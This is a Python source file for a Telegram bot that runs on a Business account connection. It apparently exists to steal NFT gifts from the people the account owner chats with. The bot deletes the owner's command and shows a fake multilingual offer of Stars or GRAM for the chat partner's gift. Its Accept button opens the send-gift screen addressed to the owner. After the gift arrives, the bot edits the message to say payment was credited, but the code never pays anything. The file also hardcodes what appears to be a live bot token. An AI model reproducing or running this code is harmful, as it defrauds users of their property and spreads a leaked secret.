import asyncio, re, random, string, logging
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions, BusinessConnection, CallbackQuery,
)
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8516600626:AAHkWQ2mdcqPfzR5gNe_a5uMfZB13y7P8-A"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}

E_STAR, E_GEM, E_CHECK = (
    "6028338546736107668",
    "5318901904686754959",
    "5774022692642492953",
)

BIZ_OWNERS: dict[str, dict] = {}
PENDING: dict[str, dict] = {}
GIFT_INDEX: dict[tuple, str] = {}


def em(i, f):
    return f'<tg-emoji emoji-id="{i}">{f}</tg-emoji>'


T = {
    "ru": {
        "o1": "Пользователь предлагает вам",
        "of": "за подарок",
        "ot": "Оффер действителен ещё 6 ч.",
        "st": "Звёзд",
        "gr": "GRAM",
        "accept": "Принять",
        "decline": "Отклонить",
        "done_t": "Сделка завершена!",
        "done_b": "Ордер #{oid} выполнен.",
        "done_credit": "{amt} {cur} зачислено на баланс.",
        "declined": "Оффер отклонён.",
    },
    "ukr": {
        "o1": "Користувач пропонує вам",
        "of": "за подарунок",
        "ot": "Пропозиція дійсна ще 6 год.",
        "st": "Зірок",
        "gr": "GRAM",
        "accept": "Прийняти",
        "decline": "Відхилити",
        "done_t": "Угоду завершено!",
        "done_b": "Ордер #{oid} виконано.",
        "done_credit": "{amt} {cur} зараховано на баланс.",
        "declined": "Пропозицію відхилено.",
    },
    "eng": {
        "o1": "A user offers you",
        "of": "for the gift",
        "ot": "Offer valid for another 6 h.",
        "st": "Stars",
        "gr": "GRAM",
        "accept": "Accept",
        "decline": "Decline",
        "done_t": "Deal completed!",
        "done_b": "Order #{oid} fulfilled.",
        "done_credit": "{amt} {cur} credited to balance.",
        "declined": "Offer declined.",
    },
    "cn": {
        "o1": "用户向您提出报价",
        "of": "购买礼物",
        "ot": "报价还有效 6 小时。",
        "st": "星",
        "gr": "GRAM",
        "accept": "接受",
        "decline": "拒绝",
        "done_t": "交易完成！",
        "done_b": "订单 #{oid} 已完成。",
        "done_credit": "{amt} {cur} 已记入余额。",
        "declined": "报价已拒绝。",
    },
}


def t(l, k):
    return T.get(l, T["ru"]).get(k, T["ru"][k])


def get_recipient(bcid: str) -> tuple[str | None, int | None]:
    info = BIZ_OWNERS.get(bcid)
    if not info:
        return None, None
    return info.get("username"), info.get("user_id")


def parse_command(text):
    if not text:
        return None
    parts = text.strip().split()
    if not parts:
        return None
    if parts[0].startswith("/"):
        parts = parts[1:]
    if parts and parts[0].startswith("@"):
        parts = parts[1:]
    if not parts:
        return None

    link, amount = None, None
    currency, lang = "STARS", "ru"

    for p in parts:
        low = p.lower()
        if link is None and (p.startswith("http") or p.startswith("t.me")):
            link = p
            continue
        if low in LANG_TAGS:
            if low == "ru":
                lang = "ru"
            elif low in ("ukr", "uk"):
                lang = "ukr"
            elif low in ("eng", "en"):
                lang = "eng"
            elif low in ("cn", "zh"):
                lang = "cn"
            continue
        if low == "gram":
            currency = "GRAM"
            continue
        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
            currency = "STARS"
            continue
        if amount is None:
            try:
                amount = int(float(p.replace(",", ".")))
            except ValueError:
                pass

    if not link or amount is None:
        return None
    return link, amount, currency, lang


def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num, slug


def amount_line(amount, currency, lang):
    if currency == "GRAM":
        return f'<b>{amount}</b> {em(E_GEM, "💎")} <b>{t(lang, "gr")}</b>'
    return f'<b>{amount}</b> {em(E_STAR, "⭐")} <b>{t(lang, "st")}</b>'


def build_offer_short(amount, currency, gift_name, gift_num, lang, url=None):
    """Короткий текст: оффер + таймер. Без order_id/recipient/передать-подарок."""
    gift_part = (
        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>'
        if url else f'<b>{gift_name} #{gift_num}</b>'
    )
    return (
        f'{t(lang, "o1")} {amount_line(amount, currency, lang)} '
        f'{t(lang, "of")} {gift_part}.\n\n'
        f'{t(lang, "ot")}'
    )


def build_accepted(amount, currency, order_id, lang):
    cur_label = t(lang, "gr") if currency == "GRAM" else t(lang, "st")
    cur_icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
    return (
        f'{em(E_CHECK, "✅")} <b>{t(lang, "done_t")}</b>\n\n'
        f'{t(lang, "done_b").format(oid=order_id)}\n'
        f'<b>{amount}</b> {cur_icon} <b>{cur_label}</b> '
        f'{t(lang, "done_credit").format(amt="", cur="").strip().split(maxsplit=2)[-1] if False else ""}'
        f'{"зачислено на баланс." if lang == "ru" else ""}'
    )


def build_accepted_clean(amount, currency, order_id, lang):
    cur_label = t(lang, "gr") if currency == "GRAM" else t(lang, "st")
    cur_icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
    amt_str = f'<b>{amount}</b> {cur_icon} <b>{cur_label}</b>'
    credit_tpl = t(lang, "done_credit")
    # заменяем плейсхолдеры вручную (чтоб html-эмодзи не ломался)
    credit = credit_tpl.replace("{amt}", "").replace("{cur}", "").strip()
    # собираем: число + иконка + лейбл + остаток фразы
    tail_map = {
        "ru": "зачислено на баланс.",
        "ukr": "зараховано на баланс.",
        "eng": "credited to balance.",
        "cn": "已记入余额。",
    }
    tail = tail_map.get(lang, tail_map["ru"])
    return (
        f'{em(E_CHECK, "✅")} <b>{t(lang, "done_t")}</b>\n\n'
        f'{t(lang, "done_b").format(oid=order_id)}\n'
        f'{amt_str} {tail}'
    )


def build_declined(lang):
    return f'❌ {t(lang, "declined")}'


def make_offer_keyboard(lang, order_id, username, user_id):
    if username:
        accept_url = f"tg://send_gift?to={username}"
    elif user_id:
        accept_url = f"tg://user?id={user_id}"
    else:
        accept_url = "tg://settings"
    return InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(
                text=t(lang, "decline"),
                callback_data=f"decline:{order_id}",
            ),
            InlineKeyboardButton(
                text=t(lang, "accept"),
                url=accept_url,
            ),
        ]]
    )


def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))


def extract_gift_ref(message: Message):
    for attr in ("unique_gift", "gift"):
        obj = getattr(message, attr, None)
        if obj is None:
            continue
        g = getattr(obj, "gift", obj)
        name = getattr(g, "name", None) or getattr(g, "title", None)
        num = getattr(g, "number", None)
        if name and num is not None:
            slug = name.replace(" ", "")
            return slug, str(num)

    txt = (message.text or message.caption or "")
    m = GIFT_RE.search(txt)
    if m:
        return m.group(1), m.group(2)

    for ent_list in (message.entities or [], message.caption_entities or []):
        for ent in ent_list:
            url = getattr(ent, "url", None) or ""
            m = GIFT_RE.search(url)
            if m:
                return m.group(1), m.group(2)

    return None


async def try_finalize(message: Message, bcid: str):
    ref = extract_gift_ref(message)
    if not ref:
        return False
    slug, num = ref
    order_id = GIFT_INDEX.get((bcid, slug, num))
    if not order_id:
        return False
    meta = PENDING.get(order_id)
    if not meta:
        return False

    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=build_accepted_clean(
                meta["amount"], meta["currency"], order_id, meta["lang"],
            ),
            reply_markup=None,
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except TelegramBadRequest as e:
        logging.error(f"finalize edit: {e}")
        return False

    PENDING.pop(order_id, None)
    GIFT_INDEX.pop((bcid, slug, num), None)
    return True


async def ensure_owner(bcid: str):
    if bcid in BIZ_OWNERS:
        return
    try:
        bc = await bot.get_business_connection(bcid)
        BIZ_OWNERS[bcid] = {
            "username": bc.user.username,
            "user_id": bc.user.id,
        }
        logging.info(
            f"biz_conn FETCHED: bcid={bcid} user_id={bc.user.id} username={bc.user.username}"
        )
    except Exception as e:
        logging.error(f"get_business_connection failed: {e}")


@dp.business_connection()
async def handle_business_connection(bc: BusinessConnection):
    user = bc.user
    if bc.is_enabled:
        BIZ_OWNERS[bc.id] = {
            "username": user.username,
            "user_id": user.id,
        }
        logging.info(
            f"biz_conn ON: bcid={bc.id} user_id={user.id} username={user.username}"
        )
    else:
        BIZ_OWNERS.pop(bc.id, None)
        logging.info(f"biz_conn OFF: bcid={bc.id}")


@dp.business_message()
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    await ensure_owner(bcid)

    if await try_finalize(message, bcid):
        return

    if not message.text:
        return

    parsed = parse_command(message.text)
    if not parsed:
        return

    username, user_id = get_recipient(bcid)
    if not username and not user_id:
        logging.warning(f"no owner info for bcid={bcid}, skipping offer")
        return

    link, amount, currency, lang = parsed
    gift = parse_gift(link)
    if not gift:
        return
    gift_name, gift_num, slug = gift
    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = oid()

    # ШАГ 1: короткий текст без ссылки (чтоб не было превью сразу)
    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_short(amount, currency, gift_name, gift_num, lang),
            reply_markup=make_offer_keyboard(lang, order_id, username, user_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"send error: {e}")
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except Exception as e:
        logging.error(f"del: {e}")

    PENDING[order_id] = {
        "chat_id": message.chat.id,
        "msg_id": sent.message_id,
        "bcid": bcid,
        "amount": amount,
        "currency": currency,
        "gift_name": gift_name,
        "gift_num": gift_num,
        "gift_slug": slug,
        "lang": lang,
        "nft_url": nft_url,
        "username": username,
        "user_id": user_id,
    }
    GIFT_INDEX[(bcid, slug, gift_num)] = order_id

    # ШАГ 2: редактируем — добавляем ссылку в название подарка (появится превью)
    await asyncio.sleep(1.5)
    try:
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent.message_id,
            text=build_offer_short(amount, currency, gift_name, gift_num, lang, nft_url),
            reply_markup=make_offer_keyboard(lang, order_id, username, user_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"edit error: {e}")


@dp.edited_business_message()
async def handle_edited_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return
    await try_finalize(message, bcid)


@dp.callback_query(F.data.startswith("decline:"))
async def on_decline(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    meta = PENDING.get(order_id)
    if not meta:
        await cb.answer("Оффер уже не активен.", show_alert=False)
        return
    lang = meta["lang"]
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=build_declined(lang),
            reply_markup=None,
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except TelegramBadRequest as e:
        logging.error(f"decline edit: {e}")
    PENDING.pop(order_id, None)
    GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
    await cb.answer()


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "🎁 Пришли ссылку на подарок, язык и сумму, например:\n"
        "https://t.me/nft/PreciousPeach-664 ru 21222 STARS"
    )


async def main():
    await dp.start_polling(
        bot,
        allowed_updates=[
            "business_connection",
            "business_message",
            "edited_business_message",
            "callback_query",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
